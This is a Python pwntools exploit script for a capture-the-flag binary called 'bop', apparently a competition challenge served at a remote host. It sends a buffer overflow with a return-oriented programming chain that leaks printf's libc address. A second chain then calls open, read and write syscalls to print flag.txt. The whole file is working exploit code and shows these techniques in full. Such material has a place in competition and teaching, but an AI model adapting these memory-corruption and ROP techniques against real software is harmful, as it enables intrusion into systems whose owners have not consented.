#!/usr/bin/env python3

from pwn import *

exe = ELF("./bop_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mc.ax", 30284)

    return r


def main():
    r = conn()

    # good luck pwning :)

    rdi = 0x4013d3
    p = flat([
        b'A' * 0x28,
        rdi, 
        exe.got['printf'],
        rdi+1,
        exe.plt['printf'],
        rdi+1,
        0x4012f9,
    ])
    r.recvuntil(b'Do you bop? ')
    r.sendline(p)
    libc.address = unpack(r.recv(6).ljust(8, b'\x00')) - libc.sym['printf']
    log.info(hex(libc.address))
    r.recvuntil(b'Do you bop?')

    rax = libc.address + 0x36174
    rsi = libc.address + 0x2601f
    rdx = libc.address + 0x142c92
    syscall = libc.address + 0x630a9
    # 0x000000000009a0cf : mov qword ptr [rax], rdi ; ret
    www = libc.address + 0x9a0cf

    buf = exe.bss() + 0x100
    p = flat([
        b'A' * 0x28,
        rax, buf, rdi, b'flag.txt', www,
        rdi,  buf, rsi, 0, rdx, 0, rax, constants.SYS_open, syscall,
        rdi, 3, rsi, buf, rdx, 0x100, rax, constants.SYS_read, syscall,
        rdi, constants.STDOUT_FILENO, rsi, buf, rdx, 0x100, rax, constants.SYS_write, syscall,
    ])
    r.sendline(p)

    r.stream()


if __name__ == "__main__":
    main()
